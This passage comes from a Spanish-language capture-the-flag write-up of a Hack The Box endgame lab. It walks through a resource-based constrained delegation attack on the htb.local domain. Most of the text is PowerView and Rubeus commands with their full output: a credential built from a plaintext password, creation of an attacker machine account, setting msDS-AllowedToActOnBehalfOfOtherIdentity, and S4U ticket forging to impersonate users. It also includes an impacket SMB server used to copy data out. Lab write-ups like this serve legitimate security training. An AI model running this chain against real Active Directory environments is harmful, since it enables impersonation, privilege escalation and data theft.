+PS C:\Users\Administrator\Documents> </span><span class="am">Import-Module </span><span class="p">.\PowerView.ps1  
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora definimos las <code class="language-plaintext highlighter-rouge">credenciales</code> del usuario <code class="language-plaintext highlighter-rouge">test-svc</code> que tiene el <code class="language-plaintext highlighter-rouge">privilegio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="ve">$SecPassword </span><span class="c1">= </span><span class="am">ConvertTo-SecureString </span><span class="az">'T3st-S3v!ce-F0r-Pr0d' </span><span class="c1">-AsPlainText -Force</span><span class="p">
+PS C:\Users\Administrator\Documents> </span><span class="ve">$Cred </span><span class="c1">=</span><span class="am"> New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">'htb.local\test-svc'</span><span class="p">, </span><span class="ve">$SecPassword</span><span class="p">)  
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora añadimos una <code class="language-plaintext highlighter-rouge">nueva</code> cuenta de <code class="language-plaintext highlighter-rouge">equipo</code> en este caos identificada con el nombre <code class="language-plaintext highlighter-rouge">attackersystem</code> y una contraseña sencilla de recordar como lo es <code class="language-plaintext highlighter-rouge">123456</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">New-MachineAccount </span><span class="c1">-MachineAccount </span><span class="p">attackersystem </span><span class="c1">-Password </span><span class="p">$(</span><span class="am">ConvertTo-SecureString </span><span class="az">'123456' </span><span class="c1">-AsPlainText </span><span class="c1">-Force</span><span class="p">) </span><span class="c1">-Credential </span><span class="ve">$Cred</span><span class="p">  
+[+] Machine account attackersystem added
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Seguimos los pasos que nos indica <code class="language-plaintext highlighter-rouge">bloodhound</code> en el apartado <code class="language-plaintext highlighter-rouge">Help</code> de GenericAll para obtener la variable <code class="language-plaintext highlighter-rouge">$SDBytes</code> del equipo <code class="language-plaintext highlighter-rouge">attackersystem</code> que hemos creado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="ve">$ComputerSid </span><span class="c1">= </span><span class="am">Get-DomainComputer </span><span class="p">attackersystem </span><span class="c1">-Properties </span><span class="p">objectsid </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="p">| </span><span class="am">Select </span><span class="c1">-Expand </span><span class="p">objectsid
+PS C:\Users\Administrator\Documents> </span><span class="ve">$SD </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">Security.AccessControl.RawSecurityDescriptor </span><span class="c1">-ArgumentList </span><span class="az">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="p">$(</span><span class="ve">$ComputerSid</span><span class="p">)</span><span class="az">)"</span><span class="p">  
+PS C:\Users\Administrator\Documents> </span><span class="ve">$SDBytes </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">byte[] (</span><span class="ve">$SD</span><span class="p">.BinaryLength)
+PS C:\Users\Administrator\Documents> </span><span class="ve">$SD</span><span class="p">.GetBinaryForm(</span><span class="ve">$SDBytes</span><span class="p">, 0)
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente seteamos el <code class="language-plaintext highlighter-rouge">objeto</code> hacia el equipo <code class="language-plaintext highlighter-rouge">WEB</code> donde tenemos los privilegios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">Get-DomainComputer </span><span class="p">WEB </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="p">| </span><span class="am">Set-DomainObject </span><span class="c1">-Set </span><span class="p">@{</span><span class="az">'msDS-AllowedToActOnBehalfOfOtherIdentity'</span><span class="c1">=</span><span class="ve">$SDBytes</span><span class="p">} </span><span class="c1">-Credential </span><span class="ve">$Cred</span><span class="p">  
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">Rubeus.exe</code> podemos convertir la contraseña <code class="language-plaintext highlighter-rouge">123456</code> que seteamos a un <code class="language-plaintext highlighter-rouge">hash</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">.\Rubeus.exe </span><span class="p">hash /password:123456 /user:attackersystem$ /domain:htb.local  
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : 123456
+[*] Input username             : attackersystem$
+[*] Input domain               : htb.local
+[*] Salt                       : HTB.LOCALhostattacketsystem.htb.local
+[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
+[*]       aes128_cts_hmac_sha1 : BB8C605808D76972251505B80FE6FDC2
+[*]       aes256_cts_hmac_sha1 : 25AE34697F20A4A40AA2568B2E000B9FEAF46DE374C432D4A34D36F1EBC50392
+[*]       des_cbc_md5          : 13E576A2D051854A
+
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando ese hash para el equipo <code class="language-plaintext highlighter-rouge">attackersystem$</code> en el dominio htb.local intentamos obtener un <code class="language-plaintext highlighter-rouge">ticket</code> suplantando a <code class="language-plaintext highlighter-rouge">Administrator</code>, sin embargo nos devuelve error</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">.\Rubeus.exe </span><span class="p">s4u /domain:htb.local /user:attackersystem$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:http/web.htb.local /ptt  
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: 32ED87BDB5FDC5E9CBA88547376818D4
+[*] Building AS-REQ (w/ preauth) for: 'htb.local\attackersystem$'
+[*] Using domain controller: 192.168.3.203:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIE/jCCBPqgAwIBBaEDAgEWooIEFTCCBBFhggQNMIIECaADAgEFoQsbCUhUQi5MT0NBTKIeMBygAwIB
+      AqEVMBMbBmtyYnRndBsJaHRiLmxvY2Fso4ID0zCCA8+gAwIBEqEDAgECooIDwQSCA70ChJzxn2/YgfCI
+      TjegtHjwUzzFILuP8PwqhwEwiTchLluMMnw4SbH5IwwQ0dmq81maSaxCRauA68z2x0nZqqjduK/sMdsE
+      KR4r4xqbkYAtlRaeXgJGSt0Ilxznnb+40pfLB/bjLQmFGfn4A0S9KlIEbqP2b3Ep9Tlifxc75Xurjccu
+      fx1v6GCtgcVfSPtZdB2TILpSG4rPx/wHtmJBE5LK6fpupsK+UL5hL0ASBnnoo+aUbT/xZlc3cP7XpovV
+      ibaVNT7jGK04W6XQo9vpNiLOOQH1l93uF/CTbJ0PN6yOVd9jBNoZxcf8DupugBeqmExPlWpF6cii7Tjr
+      1H3nnDBlDyRqxN4ChchGPAh9Zk0zHgPN5kbsrqYhsY/qWUroa5erDc5SVuIF6P1CqxouXCPescqH72IN
+      ybe4ZBuvpv/xRZRiEySquoImsnEVpRpzu+bMYtHfOc66uKiz9N+teqx7vOD+nMXbk9qGD8jUIibTWdg8
+      TAxnwnp47k8C+zKoLiwTjWUi+Pogkj8Uo7taWvmodxohTWE3cH9/RUeay+8YU+RvBBn+QCpxEe5QIpmf
+      Gb1CDoZ7MNbc4HtS550wGxulw1f1If9eufmwL5z68dn7xXyy2hUQf4XDRqTdtABDBwh8shYBbG/lEbgZ
+      4AIcG2pESETw2SXbwoQDFcD9e6FnrdneY8UZ+eUQDxoZI8ydem6piXXAbFMWQxM+21zJXp+hf2ifwT/S
+      LQUTZdtxtOJdxbVwVW+3s9mKSEQpnN3+PuZIiH1tPkHb98cM/beG94YPb8d+xIIGjruoPUsa5/izQ9iY
+      FZ11107P5e3QqoWWxyA7AMBXXv3N2pQTISAHQQ44NhkGicybSTXcOe5pZZV4dEpOhxSQfU4StCrIjHCp
+      cvhs79c0uS2zTQ/WdEO99r9PoD2n/WEm5Rf+TOVewMFw0Ac5bNX/5e8LBOOm+hb/kTSpA7T2zzqR+qDq
+      KBD53aQCjaSrapjQLhxmJTAoKtjHRpQXk1Lhx8+AGD6Jq/osZ0Dq3ROFtmJkFPURlBxR4BitDTIU718d
+      hdpHrdGXWw6Cf8PX11ZcSCLEKX7HN6CeRJe+JTn8zs8eKJJKb5ryxU06hBXFY1r+Ts8subO9CkrPon8h
+      f3P+AUF7r3z8fJq4qPYfX49fkVxHdPYfD9RdDluGn2Oa/r2PhhkGo1xeLF+Tfg87Tj4nJXlWBG3P6pdD
+      i42dcuWPy9mYJrIZhEz659dIhIJ+hiaonvm+5+cA7bKVghk01agwdet0aPhd0W+jgdQwgdGgAwIBAKKB
+      yQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBCEC4iuHAxmnekBkwS3uuo6oQsbCUhUQi5MT0NB
+      TKIcMBqgAwIBAaETMBEbD2F0dGFja2Vyc3lzdGVtJKMHAwUAQOEAAKURGA8yMDIzMDQyOTAzMTQxMlqm
+      ERgPMjAyMzA0MjkxMzE0MTJapxEYDzIwMjMwNTA2MDMxNDEyWqgLGwlIVEIuTE9DQUypHjAcoAMCAQKh
+      FTATGwZrcmJ0Z3QbCWh0Yi5sb2NhbA==
+
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'attackersystem$@HTB.LOCAL'
+[*] Using domain controller: dc1.htb.local (192.168.3.203)
+[*] Sending S4U2self request to 192.168.3.203:88
+[+] S4U2self success!
+[*] Got a TGS for 'administrator' to 'attackersystem$@HTB.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIFQjCCBT6gAwIBBaEDAgEWooIEXTCCBFlhggRVMIIEUaADAgEFoQsbCUhUQi5MT0NBTKIcMBqgAwIB
+      AaETMBEbD2F0dGFja2Vyc3lzdGVtJKOCBB0wggQZoAMCARehAwIBAaKCBAsEggQHxjCHrGk75BLfMhwB
+      i2j8R0nBHGsVdhhdlOwmOzmHKOVgKzOZWV0i8XiwENqndAq1HXTlvYB9yMXVLHX05WOOC4AY43Hx9QrQ
+      Nhjx71XX4aBoG0ZkkD92NpR0f8+LR0IzOCBKaT+wS6Ie3vXdQSJb/H6I1yTlftUFBIxWD39/nTlaW+sd
+      IVSG0CEcyaS+kESRvfwUlAjGKAngpkm+yYchHK0GaZDqSlFouQ+VJHI7hyJNT5pxsR6F5bKDhwPyTnj3
+      30ltI102p8k8eHjF9HMV1gH8M8SpetwCNQ5q4k/dY1ojB5o6u2lE2hu+Uv3g7mV9ZmUoI9PT7RQyg+TN
+      ME0aiDMOwRb2ppSOJyQ5tGxVSIoJHEoAjt3YTu/VibZc5cLPFOG60jItHWL7AnP2YW6xWJXNxw3LqwDa
+      NmZWiceQPykKMSJn2ynce7XotpuAIgfEYfOFVjQn0QGVs759W6klxLAVenfpxaTIvimuscJnap2XrH0N
+      QAZ8attbil6941TuA5HG6LdHgnlIopP2MDfERRuz3LACETNHv3EHqvBelAa6YRTNjO0iPAndcLzoXrY0
+      B4ax9VwKBIOxFhrbc8xT70GvDYd1zUhkyEexLJ7RN/Ly+33YxyzIxK5fupFiA6hvoVA4yyk7Qvg6vWkH
+      ff+LETnQmU8yTRUOAET3Epgn0CEJpI+Dr76I9QQAE8qrEEOtyHMim2e8rfSdFEC7dXst6xjpefoz4viB
+      Do/BH5FfiztCnhsWtXdy3yS/Rr2oHf5J0mq+gAkU/suy+w8tbLezApGRxhd4NpYF3gMFWmFcCmSQ4dcV
+      fxKS79k4thVZJSK21DMxNWdfnKjElb29/kCBEZClCQ58mArqSxSyNeiejvwF6IjK9W2cfPriuP9iNd2e
+      8o47m59oiB8G9gg2yv1vnrZIpzVsHO0Q4n1z5aN+RDpAPz4CSIGWZjC8lYAfkyN/XF+L1cvs2lp05zje
+      EH4F7OmBMgD1cDAZ38P4Jzw7TxWMFQzi0qOYyvOTdO6q6H82J55VK4yF26DI72CeqTzr97zrwj63b5Km
+      FiOQha5eEsGzSmJnevaHHdYbkU5uYFK7J+HVxyAvhNA6U8rIjX6oeX1WzCeC+bdFOK+Okx9OSWZfKuO6
+      G24PFbRVbv99KkBnKoXsK5cas/Ct52gTgP6MznGDEqgyRvH3dJ7hJMyXNC9KF0rDN8wdSWYwC34yWpdE
+      MaGFSmP6CUS4P++hCs06QHLUydAE+HjK64R9ZuZ1h1xW+7GylCvS78BHc9cxbcmPNtywjoAzlkSzl/pG
+      VcpS4c60/ySGwfHLpAwgkpY26KR6FwrvHhdkHmO/JncoOoNHhOf+bu7JtKEJzzgmCcXOY9+BJKYJS4uj
+      gdAwgc2gAwIBAKKBxQSBwn2BvzCBvKCBuTCBtjCBs6AbMBmgAwIBF6ESBBA1WBJo9P8YFQszZ3QSNxpM
+      oQsbCUhUQi5MT0NBTKIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAAChAAClERgPMjAyMzA0
+      MjkwMzE0MTJaphEYDzIwMjMwNDI5MTMxNDEyWqcRGA8yMDIzMDUwNjAzMTQxMlqoCxsJSFRCLkxPQ0FM
+      qRwwGqADAgEBoRMwERsPYXR0YWNrZXJzeXN0ZW0k
+
+[*] Impersonating user 'administrator' to target SPN 'http/web.htb.local'
+[*] Building S4U2proxy request for service: 'http/web.htb.local'
+[*] Using domain controller: dc1.htb.local (192.168.3.203)
+[*] Sending S4U2proxy request to domain controller 192.168.3.203:88
+
+[X] KRB-ERROR (13) : KDC_ERR_BADOPTION
+
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Enumerando en <code class="language-plaintext highlighter-rouge">bloodhound</code> nos encontramos con un grupo <code class="language-plaintext highlighter-rouge">Operations</code> al cual solo pertenece el usuario <code class="language-plaintext highlighter-rouge">lee</code>, en el tal vez que puede haber un <code class="language-plaintext highlighter-rouge">privilegio</code> especial</p>
+<a href="/endgames/hades/14.png" target="_blank"><div><p><img src="/endgames/hades/14.png"></p></div></a>
+
+<p class="plain-text">Al probar de nuevo crear el <code class="language-plaintext highlighter-rouge">ticket</code> pero esta vez suplantando al usuario <code class="language-plaintext highlighter-rouge">lee</code> nos logra generar un ticket e <code class="language-plaintext highlighter-rouge">importarlo</code> que nos servira para acceder a <code class="language-plaintext highlighter-rouge">web.htb.local</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">.\Rubeus.exe </span><span class="p">s4u /domain:htb.local /user:attackersystem$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:lee /msdsspn:http/web.htb.local /ptt  
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: 32ED87BDB5FDC5E9CBA88547376818D4
+[*] Building AS-REQ (w/ preauth) for: 'htb.local\attackersystem$'
+[*] Using domain controller: 192.168.3.203:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIE/jCCBPqgAwIBBaEDAgEWooIEFTCCBBFhggQNMIIECaADAgEFoQsbCUhUQi5MT0NBTKIeMBygAwIB
+      AqEVMBMbBmtyYnRndBsJaHRiLmxvY2Fso4ID0zCCA8+gAwIBEqEDAgECooIDwQSCA70Gl8JoNiYSvTeP
+      t/cTn/Imt8EBaSKCAEbEYCIQz2SaVVD3a2ZRND1hsnX+j28TqBP/F9kcPaW5bW779Yp1HZ9pi3FeoPNw
+      ZwgDk8rMpE8KnZe+/eIu7L1ZSKUwHoTThSGBiard3BxQMSw9Z/TOz7WNjXoj2Ew5nyUC7ePoRgq49wzn
+      Sp8X1+Qjb/OBoY083fcvwQ5nCUsvsKcXlSZhkiMSu239yCvB/FluCDc9+4kgA6Ki3AbF+q6g38t5ZqnG
+      fRzYmSjxx5+ThCx9QDlfS0WAzmQgbE/u3yr92GhXVSa52sB4Ak30U7ol0G3mnBTuV2vgk8kVbn1FNzvl
+      yf44/wkYOgUgPLNpuxNBpOHT+uc0O82Hqh3QFM92n33tm1aelSX2YXmhwMI1CXCF6xHfaSpVuBIojT6r
+      gaRCgJ0N215klYQI3PmLqtuTNt7NFmbzVfDTX/QoUcQqngHlSP1RA1LAoz20SGrCH+5FhLd2COGtle8/
+      a0gMfBDLimBIbzRhe78zl9xxVMQwecstdZrlyGmGMbiCbTl4OF7KLQS/T0BS/XYi/drOa930ZW5fkLkf
+      tNo5p2agqG0W+Tn347b02G3JM62J+vZR4n+lopzU4kPAcqBxyj8JzESv4WO1df0JLVCzZou2/nQjvSbb
+      /RUy+HuXlhJR6HJAGWwpaPaK9NNlU5lT0edtEOCOzUcT5Gj3+jvS2xMsLbPOtR1lO+0uxDKFqneogA8P
+      uGNBTwM/a1NUeHu3J4mltpVCECQshBby/q1quamv28yMsbOuHAPk+jOXvO8FkqjnxpKOXqihpcEqE3zs
+      d1ByCN1sW3ea/9TUfwJFJJl7hA+nu1gDeSECSKxW3GEkuEufBIgEix/gyZ4ZtvP471saPqukHVXiCLht
+      7Dfibr0PezscZRLynbBrpdRUGpkKP8N65Hs29US7u9kSZIN6KDgGhynlnn2mO2l96ZlctWrBNlezlHf4
+      c4qUHEJDw1nAIc8Bw0dXk905TMwSrbtD0eIYqrt29DMoY02xa9WOpUX72d5E/pRSNsTMJKk621oEwjti
+      x0f4UWE7l1P4+GY4SFbO3nV7BtqqUtRTZYza4Y/zN+XEmkE8UIjzrkpaFE01N7RHoqg+x5IFToZcoh1r
+      fjx5cbP8cGAvT3oOCpg97CE4d4jtI5755BJIiokQBfw5/Hp5PxVorjKqKeIEtdaHiJUxPAgRfEIvoB/q
+      UJFXVf80x+QboYtUSu6vSyr3ySQEt1ww4UWpLjHjTnStcVHb+0y7aaHxnys3viejgdQwgdGgAwIBAKKB
+      yQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBAQLlkk2vkz97fQC58UL3+MoQsbCUhUQi5MT0NB
+      TKIcMBqgAwIBAaETMBEbD2F0dGFja2Vyc3lzdGVtJKMHAwUAQOEAAKURGA8yMDIzMDQyOTAyNDExMFqm
+      ERgPMjAyMzA0MjkxMjQxMTBapxEYDzIwMjMwNTA2MDI0MTEwWqgLGwlIVEIuTE9DQUypHjAcoAMCAQKh
+      FTATGwZrcmJ0Z3QbCWh0Yi5sb2NhbA==
+
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'attackersystem$@HTB.LOCAL'
+[*] Using domain controller: dc1.htb.local (192.168.3.203)
+[*] Sending S4U2self request to 192.168.3.203:88
+[+] S4U2self success!
+[*] Got a TGS for 'lee' to 'attackersystem$@HTB.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIEpjCCBKKgAwIBBaEDAgEWooIDyzCCA8dhggPDMIIDv6ADAgEFoQsbCUhUQi5MT0NBTKIcMBqgAwIB
+      AaETMBEbD2F0dGFja2Vyc3lzdGVtJKOCA4swggOHoAMCARehAwIBAaKCA3kEggN1KW70YRAVBOg2kIsE
+      MD8n+CWeqpjfuqbYP2h1dm4dX53vGuXOlC+Q2aKR/UefKRIE3VSm916SJVK/4CYceatJVpbZKWGcB4Bm
+      SJLFypDvm+lCTN16eRW/VEcdmRoHPive9jiU6q3eo6QNI/JiwGCxtGViMt/efW3ydD5DdYTa9xh5joKf
+      2MOndmp73F5kq0xk47HmwfTmTg/mlLSBhG0/7d/QTefgd5jiRoepXpcdPEJ6HroHvgLugPIG7Q30TNm5
+      /trhYkc+7hDccFBupyvAdehcE3JRTYDgbzO5GZUZqsmVtJQEcAQ+8CoYsOdAGUEt9zqQTDG2lKOa1TLk
+      AkKwV7wBYbqYiUPop7/QmIkX5/OBKkAp2U6t2+2JH74xoK3WSQt2cvORrWGmljQVhPQ6MyLcMDMUgZ2/
+      Bu1MV8Bpj0qEi+6fRc3Ny6y8D1WCngzGjIbBjkarnd8B0GeIVmDL1mq0Q5AULyid06MvosQb34FIUBYU
+      o7McPp18zFkFolS/RQNw6XVhLbvHLLYrQCUA6z8TfUKOu3c4yA9ecK3Nqn+wFK1+l0LreliWsBf5FL/Y
+      C7NaKWubtRDDyDVRIA7f2CSBLP79b4oWVPntAqpr9CVM4oe4bS+6b9jxwF1SGXUZE0Lqm9+KA08RiH3s
+      tDG2WReuKR6n21a/0k10yDYDOf3nciv0M8MZd3GpKjpMByph7lp7VGayy+Fjne2oxHZuC5+uaBuJiQ+m
+      Y2mB6ccW0irHoGwoEO3ovub4LlL90R0641aCtWJ3qNZSjBmCjbhiMCdKzo9oYcAdTA++B7jLOIpJySJk
+      3B8iLSXfH8o1LmE1cyCZI50fAyChYVvAQ9JaNAjG7r9AIdUaPbSCjshwc2nwKyCJMBGREyCMwJz6qUJx
+      X/dLLvRgs3MQG8aRSde/gHeuGapk2Ag44KhbkLnJ5cMt8aae3NFsdvNiyCB0GaoUucXof0QoKIBS8XP2
+      xPHqe9uuxD9TeX037Vgz9Fs0Y7L+Uqm64vUsk9f+2kgl2yN31dRlgHADCuKQ85X70XE/8YZvu/zTrorF
+      xQYZUQA5sl2PyxDor6Mhx/Otv2tUVPR7HHk5/ZwBy9cXvPG4mhY6pI4ALlIaPKnLSp5cCKCEZq5RY/V/
+      35O9t3g6n0IQRUsTACk6TuWiR6A9DaQspqFESe35jVnno4HGMIHDoAMCAQCigbsEgbh9gbUwgbKgga8w
+      gawwgamgGzAZoAMCARehEgQQYDTbN6b1VNBxmveWBs3KAaELGwlIVEIuTE9DQUyiEDAOoAMCAQqhBzAF
+      GwNsZWWjBwMFAAChAAClERgPMjAyMzA0MjkwMjQxMTBaphEYDzIwMjMwNDI5MTI0MTEwWqcRGA8yMDIz
+      MDUwNjAyNDExMFqoCxsJSFRCLkxPQ0FMqRwwGqADAgEBoRMwERsPYXR0YWNrZXJzeXN0ZW0k
+
+[*] Impersonating user 'lee' to target SPN 'http/web.htb.local'
+[*] Building S4U2proxy request for service: 'http/web.htb.local'
+[*] Using domain controller: dc1.htb.local (192.168.3.203)
+[*] Sending S4U2proxy request to domain controller 192.168.3.203:88
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'http/web.htb.local':
+
+      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
+
+[+] Ticket successfully imported!
+
+</span><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">klist</span><span class="p">
+
+Current LogonId is 0:0x3e7
+
+Cached Tickets: (1)
+
+#0>	Client: lee @ HTB.LOCAL
+	Server: http/web.htb.local @ HTB.LOCAL
+	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+	Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize  
+	Start Time: 4/28/2023 19:56:12 (local)
+	End Time:   4/29/2023 5:56:11 (local)
+	Renew Time: 5/5/2023 19:56:11 (local)
+	Session Key Type: AES-128-CTS-HMAC-SHA1-96
+	Cache Flags: 0 
+	Kdc Called: 
+
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si de primeras en el navegador intentamos acceder con la <code class="language-plaintext highlighter-rouge">ip</code> a la página del equipo <code class="language-plaintext highlighter-rouge">WEB</code> pasando por el <code class="language-plaintext highlighter-rouge">proxy</code> que corre en el puerto <code class="language-plaintext highlighter-rouge">1080</code>, nos devolvera un <code class="language-plaintext highlighter-rouge">401</code></p>
+<a href="/endgames/hades/6.png" target="_blank"><div><p><img src="/endgames/hades/6.png"></p></div></a>
+
+<p class="plain-text">Sin embargo al hacerlo desde la <code class="language-plaintext highlighter-rouge">powershell</code> donde esta importado nuestro <code class="language-plaintext highlighter-rouge">ticket</code>, este se <code class="language-plaintext highlighter-rouge">autenticara</code> a la web con el y ahora nos devuelve un codigo de estado <code class="language-plaintext highlighter-rouge">200</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> (</span><span class="am">Invoke-WebRequest </span><span class="c1">-UseBasicParsing -UseDefaultCredentials </span><span class="p">http://web.htb.local).StatusCode  
+200
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos hacer una <code class="language-plaintext highlighter-rouge">petición</code> a el y guardar el contenido en un archivo <code class="language-plaintext highlighter-rouge">output.html</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">Invoke-WebRequest </span><span class="c1">-UseBasicParsing -UseDefaultCredentials -Uri </span><span class="p">http://web.htb.local </span><span class="c1">-OutFile </span><span class="p">output.html  
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente como antes montamos un servidor <code class="language-plaintext highlighter-rouge">smb</code> donde vamos a copiar el archivo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
